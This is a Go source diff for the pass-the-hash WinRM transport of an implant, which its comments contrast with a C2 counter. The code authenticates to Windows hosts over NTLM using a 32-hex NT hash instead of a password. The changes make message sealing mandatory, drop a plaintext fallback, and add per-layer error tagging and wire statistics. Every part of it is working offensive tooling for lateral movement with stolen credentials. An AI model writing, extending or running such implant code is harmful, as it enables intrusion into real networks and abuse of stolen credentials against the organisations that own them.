@@ -30,8 +30,8 @@ import (
 // Session ownership: the only security session is hashNegotiator.session.
 // All Post / ensureSession / seal work holds mu so RC4 seq state cannot desync.
 //
-// Permissive policy: prefer seal when possible, but fall back to plaintext SOAP on
-// seal build failures, 415/encryption errors, or soft unseal failures that look like SOAP.
+// One flow: if Sign/Seal was negotiated, every SOAP message is sealed. No
+// seal→plain retry. Failures are tagged with pth_layer=… (Day-3 gate).
 type clientNTLMHash struct {
 	url    string
 	user   string // DOMAIN\user or bare user
@@ -40,11 +40,17 @@ type clientNTLMHash struct {
 	domain string
 	acct   string
 
-	mu sync.Mutex
+	mu  sync.Mutex
 	neg *hashNegotiator
 
-	// preferPlain disables encryption for this client after a seal attempt was rejected.
-	preferPlain bool
+	stats pthWireStats
+}
+
+// pthWireStats is implant-local (not a C2 counter). Handshake once, then N SOAP posts.
+type pthWireStats struct {
+	AuthProbes int
+	SOAPPosts  int
+	NTLMRounds int
 }
 
 func newClientNTLMWithHash(user, hashHex string) *clientNTLMHash {
@@ -94,7 +100,7 @@ func (c *clientNTLMHash) Transport(endpoint *winrm.Endpoint) error {
 
 func (c *clientNTLMHash) Post(_ *winrm.Client, request *soap.SoapMessage) (string, error) {
 	if c.url == "" || c.httpT == nil {
-		return "", fmt.Errorf("winrm hash transport not initialized")
+		return "", pthWrap(PTHLayerTransport, fmt.Errorf("winrm hash transport not initialized"))
 	}
 
 	// Hold mu for the full auth + seal + exchange so session keys/seq stay coherent.
@@ -106,58 +112,50 @@ func (c *clientNTLMHash) Post(_ *winrm.Client, request *soap.SoapMessage) (strin
 	}
 
 	plain := []byte(request.String())
-	useEnc := !c.preferPlain && c.neg.session != nil && canSeal(c.neg.session.flags)
+	useEnc := c.neg.session != nil && canSeal(c.neg.session.flags)
 
 	body, ct, status, err := c.doSOAPLocked(plain, useEnc)
 	if err != nil {
 		return "", err
 	}
 
-	// Soft path: sealed request rejected → drop encryption preference and retry plain once.
-	if useEnc && isEncryptionRejected(status, body) {
-		c.preferPlain = true
-		body, ct, status, err = c.doSOAPLocked(plain, false)
-		if err != nil {
-			return "", err
-		}
-	}
-
 	if status == http.StatusUnauthorized {
+		wasComplete := c.neg != nil && c.neg.complete
 		c.resetSessionLocked()
 		snippet := clipBody(body, 256)
-		return "", fmt.Errorf(
+		layer := PTHLayerNTLMHandshake
+		if wasComplete {
+			layer = PTHLayerSessionLife
+		}
+		return "", pthWrap(layer, fmt.Errorf(
 			"http error 401 unauthorized (user=%s domain=%s): NTLM rejected — "+
 				"verify NETBIOS domain + 32-hex NT hash. body: %s",
-			c.acct, c.domain, snippet)
+			c.acct, c.domain, snippet))
 	}
 	if status != http.StatusOK {
 		snippet := clipBody(body, 256)
 		if isEncryptionRejected(status, body) {
-			return "", fmt.Errorf(
-				"http error %d: WinRM message encryption issue (sealed and plain attempts). body: %s",
-				status, snippet)
+			return "", pthWrap(PTHLayerWinRMMIME, fmt.Errorf(
+				"http error %d: WinRM message encryption rejected (no plain retry). body: %s",
+				status, snippet))
 		}
-		return "", fmt.Errorf("http error %d: %s", status, snippet)
+		return "", pthWrap(PTHLayerWinRMMIME, fmt.Errorf("http error %d: %s", status, snippet))
 	}
 
-	// Decrypt if we used encryption (or response looks encrypted).
 	sess := c.neg.session
 	if useEnc && sess != nil {
 		plainOut, uerr := parseEncryptedWinRMBody(body, ct, sess)
 		if uerr != nil {
-			// Permissive: accept plain SOAP / XML even when unseal fails.
-			if looksLikeSOAP(body) || strings.Contains(ct, "application/soap+xml") {
-				return string(body), nil
-			}
-			return "", fmt.Errorf("winrm unseal: %w", uerr)
+			return "", pthWrap(PTHLayerSignSeal, fmt.Errorf("winrm unseal: %w", uerr))
 		}
 		return string(plainOut), nil
 	}
-	// Plain request — still try unseal if server replied encrypted.
 	if sess != nil && (strings.Contains(ct, "multipart/encrypted") || bytes.Contains(body, []byte("Encrypted Boundary"))) {
-		if plainOut, uerr := parseEncryptedWinRMBody(body, ct, sess); uerr == nil {
-			return string(plainOut), nil
+		plainOut, uerr := parseEncryptedWinRMBody(body, ct, sess)
+		if uerr != nil {
+			return "", pthWrap(PTHLayerWinRMMIME, fmt.Errorf("encrypted response unseal: %w", uerr))
 		}
+		return string(plainOut), nil
 	}
 	return string(body), nil
 }
@@ -171,28 +169,27 @@ func (c *clientNTLMHash) doSOAPLocked(plain []byte, encrypt bool) (body []byte, 
 	if encrypt && c.neg.session != nil {
 		encBody, ct, berr := buildEncryptedWinRMBody(plain, c.neg.session)
 		if berr != nil {
-			// Seal build failed — fall back to plaintext for this attempt.
-			bodyReader = bytes.NewReader(plain)
-		} else {
-			bodyReader = bytes.NewReader(encBody)
-			contentType = ct
+			return nil, "", 0, pthWrap(PTHLayerSignSeal, fmt.Errorf("seal SOAP: %w", berr))
 		}
+		bodyReader = bytes.NewReader(encBody)
+		contentType = ct
 	} else {
 		bodyReader = bytes.NewReader(plain)
 	}
 
 	req, err := http.NewRequest(http.MethodPost, c.url, bodyReader)
 	if err != nil {
-		return nil, "", 0, fmt.Errorf("create winrm request: %w", err)
+		return nil, "", 0, pthWrap(PTHLayerTransport, fmt.Errorf("create winrm request: %w", err))
 	}
 	req.Header.Set("Content-Type", contentType)
 	req.Header.Set("Connection", "Keep-Alive")
 	req.Header.Set("User-Agent", "WinRM client")
 	req.SetBasicAuth(c.user, "x")
 
+	c.stats.SOAPPosts++
 	resp, err := httpClient.Do(req)
 	if err != nil {
-		return nil, "", 0, fmt.Errorf("winrm post: %w", err)
+		return nil, "", 0, pthWrapNet(fmt.Errorf("winrm post: %w", err))
 	}
 	defer resp.Body.Close()
 	body, err = io.ReadAll(resp.Body)
@@ -217,7 +214,7 @@ func isEncryptionRejected(status int, body []byte) bool {
 
 func (c *clientNTLMHash) ensureSessionLocked() error {
 	if c.neg == nil {
-		return fmt.Errorf("winrm hash transport not initialized")
+		return pthWrap(PTHLayerTransport, fmt.Errorf("winrm hash transport not initialized"))
 	}
 	// Auth done (with or without seal keys) is sticky — do not re-probe every Post.
 	if c.neg.complete {
@@ -228,7 +225,7 @@ func (c *clientNTLMHash) ensureSessionLocked() error {
 	httpClient := &http.Client{Transport: c.neg, Timeout: 90 * time.Second}
 	req, err := http.NewRequest(http.MethodPost, c.url, nil)
 	if err != nil {
-		return fmt.Errorf("create winrm auth probe: %w", err)
+		return pthWrap(PTHLayerTransport, fmt.Errorf("create winrm auth probe: %w", err))
 	}
 	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
 	req.Header.Set("Content-Length", "0")
@@ -236,31 +233,30 @@ func (c *clientNTLMHash) ensureSessionLocked() error {
 	req.Header.Set("User-Agent", "WinRM client")
 	req.SetBasicAuth(c.user, "x")
 
+	c.stats.AuthProbes++
 	resp, err := httpClient.Do(req)
 	if err != nil {
-		return fmt.Errorf("winrm ntlm auth: %w", err)
+		return pthWrapNet(fmt.Errorf("winrm ntlm auth: %w", err))
 	}
 	_, _ = io.Copy(io.Discard, resp.Body)
 	_ = resp.Body.Close()
 
-	// Permissive auth acceptance: NTLM complete is enough even if empty probe is not 200
-	// (some hosts return 400/500 on zero-length body after accepting auth).
 	if c.neg.complete {
 		return nil
 	}
 	if resp.StatusCode == http.StatusUnauthorized {
 		c.resetSessionLocked()
-		return fmt.Errorf("winrm ntlm auth http 401 (user=%s domain=%s)", c.acct, c.domain)
+		return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("winrm ntlm auth http 401 (user=%s domain=%s)", c.acct, c.domain))
 	}
-	if resp.StatusCode != http.StatusOK {
+	if !hasNegotiateOrNTLM(resp.Header.Values("Www-Authenticate")) && resp.StatusCode != http.StatusOK {
 		c.resetSessionLocked()
-		return fmt.Errorf("winrm ntlm auth http %d (user=%s domain=%s)", resp.StatusCode, c.acct, c.domain)
+		return pthWrap(PTHLayerHTTPNegotiate, fmt.Errorf("winrm ntlm auth http %d (user=%s domain=%s)", resp.StatusCode, c.acct, c.domain))
 	}
-	return fmt.Errorf("winrm ntlm auth did not complete")
+	c.resetSessionLocked()
+	return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("winrm ntlm auth did not complete"))
 }
 
 func (c *clientNTLMHash) resetSessionLocked() {
-	c.preferPlain = false
 	if c.neg != nil {
 		c.neg.reset()
 	}
@@ -287,7 +283,18 @@ type hashNegotiator struct {
 	complete     bool
 	session      *ntlmSecuritySession
 	negotiateMsg []byte // TYPE1 bytes for MIC
+	ntlmRounds   int
 	onReset      func()
+}
+
+func (c *clientNTLMHash) statsSnapshot() pthWireStats {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	s := c.stats
+	if c.neg != nil {
+		s.NTLMRounds = c.neg.ntlmRounds
+	}
+	return s
 }
 
 func (l *hashNegotiator) reset() {
@@ -312,7 +319,7 @@ func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
 		req2.Header.Del("Authorization")
 		res, err := rt.RoundTrip(req2)
 		if err != nil {
-			return nil, err
+			return nil, pthWrapNet(err)
 		}
 		if res.StatusCode == http.StatusUnauthorized {
 			// Session dead — clear the only session so callers cannot seal with stale keys.
@@ -353,13 +360,13 @@ func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
 	req.Header.Del("Authorization")
 	res, err := rt.RoundTrip(req)
 	if err != nil {
-		return nil, err
+		return nil, pthWrapNet(err)
 	}
 	if res.StatusCode != http.StatusUnauthorized {
 		return res, nil
 	}
 	if !hasNegotiateOrNTLM(res.Header.Values("Www-Authenticate")) {
-		return res, nil
+		return nil, pthWrap(PTHLayerHTTPNegotiate, fmt.Errorf("401 without NTLM/Negotiate Www-Authenticate"))
 	}
 	_, _ = io.Copy(io.Discard, res.Body)
 	_ = res.Body.Close()
@@ -376,9 +383,10 @@ func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
 	// TYPE1 with seal flags (Sign|Seal|KeyExch|…) so session keys can be derived.
 	neg, err := newNegotiateMessageSeal(domain, "")
 	if err != nil {
-		return nil, err
+		return nil, pthWrap(PTHLayerNTLMHandshake, err)
 	}
 	l.negotiateMsg = neg
+	l.ntlmRounds++
 
 	www := res.Header.Values("Www-Authenticate")
 	req.Header.Set("Authorization", authPrefix(www)+base64.StdEncoding.EncodeToString(neg))
@@ -386,12 +394,12 @@ func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
 
 	res, err = rt.RoundTrip(req)
 	if err != nil {
-		return nil, err
+		return nil, pthWrapNet(err)
 	}
 	www = res.Header.Values("Www-Authenticate")
 	challenge, err := getAuthData(www)
 	if err != nil {
-		return nil, err
+		return nil, pthWrap(PTHLayerNTLMHandshake, err)
 	}
 	if len(challenge) == 0 {
 		return res, nil
@@ -407,7 +415,7 @@ func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
 	req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))
 	res, err = rt.RoundTrip(req)
 	if err != nil {
-		return nil, err
+		return nil, pthWrapNet(err)
 	}
 	// Permissive complete: treat TYPE3 as accepted unless we clearly got 401.
 	// Empty-body probes sometimes return 400/500 after a successful NTLM handshake.
@@ -516,15 +524,15 @@ func ntlmAuthenticateWithHashSession(challengeMessageData []byte, user, domain, 
 	}
 	hashBytes, err := hex.DecodeString(strings.ToLower(strings.TrimSpace(hashNT)))
 	if err != nil || len(hashBytes) != 16 {
-		return nil, nil, fmt.Errorf("invalid NT hash: %w", err)
+		return nil, nil, pthWrap(PTHLayerKeyDerivation, fmt.Errorf("invalid NT hash: %w", err))
 	}
 
 	if len(challengeMessageData) < 48 || string(challengeMessageData[0:8]) != "NTLMSSP\x00" {
-		return nil, nil, fmt.Errorf("invalid NTLM challenge")
+		return nil, nil, pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("invalid NTLM challenge"))
 	}
 	msgType := binary.LittleEndian.Uint32(challengeMessageData[8:12])
 	if msgType != 2 {
-		return nil, nil, fmt.Errorf("expected NTLM type 2, got %d", msgType)
+		return nil, nil, pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("expected NTLM type 2, got %d", msgType))
 	}
 	flags := binary.LittleEndian.Uint32(challengeMessageData[20:24])
 	serverChallenge := challengeMessageData[24:32]
@@ -600,11 +608,11 @@ func ntlmAuthenticateWithHashSession(challengeMessageData []byte, user, domain, 
 	}
 
 	var session *ntlmSecuritySession
-	// Build a seal session when Sign or Seal was granted. Soft-fail: auth still works without it.
+	// If Sign/Seal was granted, the one flow is sealed SOAP. Fail closed on session setup.
 	if flags&ntlmFlagSeal != 0 || flags&ntlmFlagSign != 0 {
 		session, err = newClientSecuritySession(flags, exportedSessionKey)
 		if err != nil {
-			session = nil // plaintext path still available
+			return nil, nil, pthWrap(PTHLayerSignSeal, err)
 		}
 	}
 
